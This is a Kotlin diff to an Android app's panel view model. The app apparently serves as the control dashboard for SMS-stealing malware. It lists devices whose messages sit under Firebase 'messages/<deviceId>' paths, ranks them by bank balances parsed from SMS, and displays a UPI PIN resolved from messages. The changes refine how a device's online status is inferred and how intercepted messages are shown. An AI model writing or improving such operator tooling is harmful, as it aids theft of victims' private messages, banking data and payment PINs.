@@ -313,6 +313,27 @@ class PanelViewModel(application: Application) : AndroidViewModel(application) {
  * Virtus / Firebase paths look like `messages/<deviceId>/<pushKey>/...`.
  * The device id is the segment **after** `messages`/`sms`/`inbox`, not the leaf key.
  */
+/** If client has no `status`-style field, treat recent last-seen / last-SMS as online (Virtus-style). */
+private const val ONLINE_INFER_GRACE_MS = 10 * 60 * 1000L
+
+private fun resolveDeviceOnline(
+    snap: DeviceSnapshot?,
+    fr: FetchResult,
+    lastMessageMillis: Long?,
+): Boolean {
+    val explicit = snap?.clientOnline
+    if (explicit != null) return explicit
+    val ref =
+        listOfNotNull(
+            snap?.lastSeenMillis?.takeIf { it > 0L },
+            lastMessageMillis?.takeIf { it > 0L },
+        ).maxOrNull()
+    if (ref != null) {
+        return System.currentTimeMillis() - ref <= ONLINE_INFER_GRACE_MS
+    }
+    return fr.online
+}
+
 private fun deviceIdFromPath(path: String): String {
     val parts = path.split("/").filter { it.isNotEmpty() }
     if (parts.isEmpty()) return "unknown"
@@ -419,11 +440,12 @@ private fun buildDeviceList(
                 if (msgs.isNotEmpty()) continue
                 if (!fromClientsOnly) continue
             }
-            val deviceOnline = snap?.clientOnline ?: fr.online
+            val lastMsgAny = msgs.maxOfOrNull { it.messageAtMillis ?: 0L }?.takeIf { it > 0L }
+            val deviceOnline = resolveDeviceOnline(snap, fr, lastMsgAny)
             if (!connectionOk(deviceOnline, cfg.connection)) continue
             val balances = filtered.mapNotNull { mainBalanceForSort(it.body) }
             val maxBal = balances.maxOrNull() ?: 0.0
-            val times = filtered.mapNotNull { it.messageAtMillis }
+            val times = msgs.mapNotNull { it.messageAtMillis }
             val lastAct = times.maxOrNull() ?: (snap?.lastSeenMillis ?: 0L)
             val previewSms = filtered.maxByOrNull { it.messageAtMillis ?: 0L }
             val preview = previewSms?.sender?.ifBlank { "(sender)" } ?: ""
@@ -495,7 +517,8 @@ private fun buildLiveFeedList(
         val byDev = fr.sms.groupBy { deviceIdFromPath(it.rawPath) }
         for ((devId, msgs) in byDev) {
             val snap = fr.devices[devId]
-            val deviceOnline = snap?.clientOnline ?: fr.online
+            val lastMsgAny = msgs.maxOfOrNull { it.messageAtMillis ?: 0L }?.takeIf { it > 0L }
+            val deviceOnline = resolveDeviceOnline(snap, fr, lastMsgAny)
             if (!connectionOk(deviceOnline, cfg.connection)) continue
             val devicePin = deviceHasPinResolved(msgs, snap)
             if (!pinOkForDevice(devicePin, cfg.pinFilter, cfg.inboxMode)) continue
@@ -528,8 +551,9 @@ private fun buildDeviceDetail(results: List<FetchResult>, row: DeviceRow, cfg: F
     val snap = fr.devices[row.deviceId]
     val devicePin = deviceHasPinResolved(msgs, snap)
     val filtered = filterSmsList(msgs, cfg)
+    val basis = filtered.ifEmpty { msgs.sortedByDescending { it.messageAtMillis ?: 0L }.take(500) }
     val smsRows =
-        filtered.map { s ->
+        basis.map { s ->
             SmsRow(
                 sender = s.sender.ifBlank { "(unknown sender)" },
                 body = s.body,
@@ -548,10 +572,12 @@ private fun buildDeviceDetail(results: List<FetchResult>, row: DeviceRow, cfg: F
                 }
             else -> smsRows.sortedByDescending { it.messageAtMillis ?: 0L }
         }
+    val lastMsgAny = msgs.maxOfOrNull { it.messageAtMillis ?: 0L }?.takeIf { it > 0L }
+    val onlineResolved = resolveDeviceOnline(snap, fr, lastMsgAny)
     return DeviceDetail(
         firebaseUrl = row.firebaseUrl,
         deviceId = row.deviceId,
-        online = row.online,
+        online = onlineResolved,
         deviceHasPin = devicePin,
         upiPinDisplay = resolveUpiPin(msgs, snap),
         modelDisplay = row.modelDisplay,
